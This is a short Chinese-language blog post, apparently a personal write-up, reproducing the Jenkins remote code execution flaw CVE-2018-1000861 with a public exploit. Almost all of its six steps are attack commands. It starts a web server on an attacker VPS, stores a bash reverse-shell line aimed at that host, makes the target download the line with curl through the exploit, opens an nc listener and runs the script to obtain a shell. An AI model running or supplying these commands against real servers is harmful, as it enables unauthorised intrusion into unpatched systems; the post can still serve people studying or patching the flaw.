---
title: "记一次说CVE-2018-1000861复现利用"
date: 2020-08-14 22:00:50
tags:
---
# 0x00 漏洞复现利用

此漏洞没有回显，直接利用orange的exp执行命令反弹shell

`https://github.com/orangetw/awesome-jenkins-rce-2019`

## step.1 在vps上使用Python启动一个临时web服务器
```
python -m SimpleHTTPServer
```
启动成功如下图所示：
![webServer_start](/assets/CVE-2018-1000861/webServer_start.png)

## step.2 在上面的web服务器内写入txt文本(要在启动web服务器的相同目录内)内容为：
```
bash -i >& /dev/tcp/{webServer_ip}/6666 0>&1
```
![write_bash](/assets/CVE-2018-1000861/write_bash.png)

## step.3 使用下载好的exp.py执行以下命令，下载step2在web服务器中写入的txt文件
```
python2 exp.py http://{靶机ip}:8080/ "curl -o /tmp/6666.sh http://{webServer_ip}:8000/007.txt"
```
![download](/assets/CVE-2018-1000861/download_txt.png)

## step.4 在Web服务器上再额外监听step2中写入的端口
```
nc -lvvp 6666
```
![nc](/assets/CVE-2018-1000861/nc.png)

## step.5 直接bash执行刚刚下载好的脚本
```
python2 exp.py http://{靶机ip}:8080/ "bash /tmp/6666.sh"
```
![exe_bash](/assets/CVE-2018-1000861/exe_bash.png)
## step.6 bingo~getshell~
![webshell](/assets/CVE-2018-1000861/webshell.png)